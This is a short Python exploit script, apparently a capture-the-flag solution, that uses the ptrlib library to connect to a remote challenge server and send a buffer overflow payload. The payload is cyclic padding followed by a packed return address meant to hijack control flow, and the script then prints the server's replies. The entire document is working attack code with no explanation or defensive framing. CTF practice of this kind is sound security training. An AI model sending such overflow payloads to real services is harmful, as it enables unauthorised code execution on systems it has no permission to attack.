from ptrlib import *

sock = Socket("thekidofarcrania.com", 4902)

payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + '\x86\x85\x04\x08'

sock.sendlineafter("Input some text:", payload)

while True:
	print(sock.recvline().decode("utf-8"))